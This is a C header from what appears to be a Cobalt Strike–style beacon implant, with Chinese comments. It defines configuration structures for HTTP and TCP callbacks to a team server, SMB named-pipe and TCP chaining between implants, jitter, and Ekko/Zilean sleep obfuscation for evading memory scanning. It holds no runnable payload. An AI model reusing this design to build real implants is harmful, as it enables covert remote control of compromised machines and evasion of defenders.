#pragma once

#include "beacon_common.h"

/* HTTP 传输配置 */
typedef struct HttpProfile {
    CHAR method[16];            /* HTTP 方法（GET/POST） */
    CHAR target[256];           /* 目标 URI 路径 */
    CHAR uri[256];              /* 完整 URI */
    CHAR host_header[256];      /* Host 头 */
    CHAR response_headers[1024];/* 自定义响应头 */
    CHAR hb_header[64];         /* 心跳使用的 header 名 */
    CHAR hb_prefix[64];         /* 心跳 header 值前缀 */
    CHAR user_agent[256];       /* User-Agent */
    CHAR content_type[128];     /* Content-Type */
    CHAR encrypt_key[128];      /* AES 加密密钥（hex 编码） */
    CHAR ssl_cert[1024];        /* SSL 证书路径 */
    CHAR ssl_key[2048];         /* SSL 私钥路径 */
    INT ssl;                    /* 是否启用 SSL */
    INT x_forwarded_for;        /* 是否添加 X-Forwarded-For 头 */
    INT reconnect_count;        /* 重连次数上限 */
    INT reconnect_time_ms;      /* 重连间隔（ms） */
} HttpProfile;

/* external TCP 回连配置 */
typedef struct TcpExternalProfile {
    CHAR callback_host[256];    /* TeamServer TCP listener 回连地址 */
    INT callback_port;          /* TeamServer TCP listener 回连端口 */
    INT reconnect_count;        /* 重连次数上限 */
    INT reconnect_time_ms;      /* 重连间隔（ms） */
    INT ssl;                    /* 是否启用 TLS（SChannel） */
    CHAR encrypt_key[128];      /* AES 加密密钥（hex 编码） */
} TcpExternalProfile;

/* internal TCP 级联配置 */
typedef struct TcpInternalProfile {
    CHAR bind_host[64];         /* 监听地址 */
    INT bind_port;              /* 监听端口 */
    INT connect_timeout_ms;     /* 连接超时（ms） */
} TcpInternalProfile;

/* internal SMB 级联配置 */
typedef struct SmbInternalProfile {
    CHAR pipe_name[128];        /* 命名管道路径 */
    INT connect_timeout_ms;     /* 连接超时（ms） */
} SmbInternalProfile;

/* 睡眠混淆技术选择 */
typedef enum SleepObfTechnique {
    SLEEP_OBF_NONE = 0,        /* 不使用混淆 */
    SLEEP_OBF_EKKO = 1,        /* RtlCreateTimerQueue + NtContinue */
    SLEEP_OBF_ZILEAN = 2       /* RtlRegisterWait */
} SleepObfTechnique;

/* sleep 混淆定位映像所需的预计算布局 */
typedef struct SleepObfImageLayout {
    BOOL valid;                 /* 是否由 profile patch 提供 */
    UINT32 image_size;          /* OptionalHeader.SizeOfImage */
    UINT32 text_rva;            /* .text VirtualAddress */
    UINT32 text_size;           /* .text VirtualSize/RawSize */
    UINT32 text_protect;        /* .text 原始保护属性 */
} SleepObfImageLayout;

/* Beacon 通信配置 */
typedef struct Profile {
    CHAR listener_name[128];    /* 监听器名称 */
    CHAR listener_type[64];     /* 监听器类型（external/internal） */
    CHAR protocol[32];          /* 协议（http/tcp/smb） */
    CHAR format[32];            /* 输出格式 */
    INT sleep_ms;               /* 基础睡眠时间（ms） */
    INT jitter;                 /* 抖动百分比（0-100） */
    INT conn_timeout_sec;       /* 连接超时（秒） */
    BOOL sleep_obf_enabled;     /* 是否启用睡眠混淆 */
    SleepObfTechnique sleep_obf_technique; /* 混淆技术选择 */
    SleepObfImageLayout sleep_layout; /* 预计算映像布局 */
    CHAR encrypt_key[128];      /* 通用通信加密 key */
    HttpProfile http;           /* HTTP 传输配置 */
    TcpExternalProfile tcp_external; /* TCP external 回连配置 */
    TcpInternalProfile tcp_internal; /* TCP 级联配置 */
    SmbInternalProfile smb_internal; /* SMB 级联配置 */
} Profile;

/* 从 beacon 元数据中加载配置 */
VOID ProfileLoad(Profile* profile);
